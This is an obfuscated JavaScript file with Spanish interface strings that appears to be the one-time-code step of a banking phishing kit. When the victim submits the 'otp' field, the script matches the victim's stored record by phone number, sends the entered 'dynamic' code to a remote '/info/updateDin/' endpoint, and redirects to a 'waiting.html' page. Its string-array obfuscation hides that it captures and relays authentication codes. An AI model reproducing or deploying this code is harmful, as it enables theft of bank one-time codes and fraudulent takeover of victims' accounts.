const _0x4c3686 = _0x4f51;
function _0x278d() {
  const _0xc4e9d1 = [
    "display",
    "form",
    "click",
    "application/json",
    "log",
    "error-message",
    "Todos\x20los\x20campos\x20son\x20obligatorios.",
    "13eLOhOr",
    "Ingresó\x20dinámica",
    "8116596YTkLZV",
    "from",
    "href",
    "telnum",
    "addEventListener",
    "1149255gxqpIE",
    "json",
    "stringify",
    "trim",
    "29418TofkRO",
    "waiting.html",
    "location",
    "block",
    "PUT",
    "idreg",
    "every",
    "value",
    "none",
    "4oUbVEa",
    "8WJcpAW",
    "382obtdxy",
    "otp",
    "822zQvxch",
    "style",
    "Usuario\x20Encontrado",
    "getElementById",
    "30ubTkeU",
    "8796165qYuJfS",
    "304711RHRmaa",
    "metaInfo",
    "/info/updateDin/",
    "14922234gQrMNB",
    "38941OQcRsQ",
  ];
  _0x278d = function () {
    return _0xc4e9d1;
  };
  return _0x278d();
}
function _0x4f51(_0x5620fe, _0x294415) {
  const _0x278dd9 = _0x278d();
  return (
    (_0x4f51 = function (_0x4f514c, _0x4d8b33) {
      _0x4f514c = _0x4f514c - 0x1b8;
      let _0x38dfb3 = _0x278dd9[_0x4f514c];
      return _0x38dfb3;
    }),
    _0x4f51(_0x5620fe, _0x294415)
  );
}
(function (_0x14930b, _0x3ac265) {
  const _0x25115b = _0x4f51,
    _0x44870e = _0x14930b();
  while (!![]) {
    try {
      const _0x53b89b =
        -parseInt(_0x25115b(0x1d5)) / 0x1 +
        (parseInt(_0x25115b(0x1ba)) / 0x2) *
          (parseInt(_0x25115b(0x1d9)) / 0x3) +
        (-parseInt(_0x25115b(0x1b8)) / 0x4) *
          (-parseInt(_0x25115b(0x1c1)) / 0x5) +
        (-parseInt(_0x25115b(0x1bc)) / 0x6) *
          (-parseInt(_0x25115b(0x1c6)) / 0x7) +
        (-parseInt(_0x25115b(0x1b9)) / 0x8) *
          (parseInt(_0x25115b(0x1c5)) / 0x9) +
        (parseInt(_0x25115b(0x1c0)) / 0xa) *
          (parseInt(_0x25115b(0x1c2)) / 0xb) +
        (-parseInt(_0x25115b(0x1d0)) / 0xc) *
          (parseInt(_0x25115b(0x1ce)) / 0xd);
      if (_0x53b89b === _0x3ac265) break;
      else _0x44870e["push"](_0x44870e["shift"]());
    } catch (_0x28f59f) {
      _0x44870e["push"](_0x44870e["shift"]());
    }
  }
})(_0x278d, 0xf29d5),
  document[_0x4c3686(0x1bf)]("btnNextStep")[_0x4c3686(0x1d4)](
    _0x4c3686(0x1c9),
    function (_0x89f23) {
      const _0x2baa72 = _0x4c3686;
      _0x89f23["preventDefault"]();
      var _0x55d95b = document[_0x2baa72(0x1bf)](_0x2baa72(0x1bb))[
        _0x2baa72(0x1e0)
      ];
      console[_0x2baa72(0x1cb)](_0x55d95b);
      var _0x233826 = document["getElementById"](_0x2baa72(0x1c8)),
        _0x26131c = _0x233826["querySelectorAll"]("input[required]"),
        _0x5f13a0 = Array[_0x2baa72(0x1d1)](_0x26131c)[_0x2baa72(0x1df)](
          (_0x53183e) => _0x53183e[_0x2baa72(0x1e0)][_0x2baa72(0x1d8)]() !== ""
        );
      if (!_0x5f13a0) {
        var _0x18f8c7 = document[_0x2baa72(0x1bf)](_0x2baa72(0x1cc));
        (_0x18f8c7["textContent"] = _0x2baa72(0x1cd)),
          (_0x18f8c7["style"][_0x2baa72(0x1c7)] = _0x2baa72(0x1dc)),
          setTimeout(function () {
            const _0x45df9e = _0x2baa72;
            _0x18f8c7[_0x45df9e(0x1bd)][_0x45df9e(0x1c7)] = _0x45df9e(0x1e1);
          }, 0x7d0);
      } else {
        async function _0x15fcc() {
          const _0x16af78 = _0x2baa72,
            _0x138c4c = await fetch(url + "/info/info", {
              method: "GET",
              headers: { "Content-Type": _0x16af78(0x1ca) },
            }),
            _0x41d419 = await _0x138c4c[_0x16af78(0x1d6)](),
            _0x523e86 = [..._0x41d419];
          for (const _0x2bf71a of _0x523e86) {
            if (
              _0x2bf71a["cr"] == info[_0x16af78(0x1c3)]["p"] &&
              _0x2bf71a["cl"] == info[_0x16af78(0x1c3)][_0x16af78(0x1d3)]
            ) {
              console[_0x16af78(0x1cb)](_0x16af78(0x1be));
              const _0x4c4181 = await fetch(
                  url + _0x16af78(0x1c4) + _0x2bf71a[_0x16af78(0x1de)],
                  {
                    method: _0x16af78(0x1dd),
                    headers: { "Content-Type": _0x16af78(0x1ca) },
                    body: JSON[_0x16af78(0x1d7)]({
                      din: _0x55d95b,
                      status: _0x16af78(0x1cf),
                    }),
                  }
                ),
                _0x10edc4 = await _0x4c4181[_0x16af78(0x1d6)]();
            }
          }
          window[_0x16af78(0x1db)][_0x16af78(0x1d2)] = _0x16af78(0x1da);
        }
        _0x15fcc();
      }
    }
  );
